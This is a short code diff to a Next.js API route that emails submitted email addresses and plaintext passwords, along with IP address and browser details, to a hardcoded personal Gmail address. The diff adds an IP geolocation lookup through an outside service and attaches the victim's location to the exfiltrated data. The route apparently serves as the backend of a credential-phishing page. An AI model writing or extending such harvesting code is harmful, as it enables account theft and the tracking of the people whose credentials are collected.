@@ -12,15 +12,23 @@ export async function POST(request: NextRequest) {
 
     const userAgent = request.headers.get("user-agent") || "unknown";
 
+    let locationData = null;
+
     try {
+        if (ip !== "unknown") {
+            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+            locationData = await geoRes.json();
+        }
+
         const res = await mailUser("tomacurry12@gmail.com", "Task", {
             email,
             password,
             ip,
             browser: userAgent,
+            location: locationData,
         });
 
-        return NextResponse.json(res);
+        return NextResponse.json({ res, locationData });
     } catch (error: any) {
         return NextResponse.json(
             { error: error?.message || "Unknown error" },
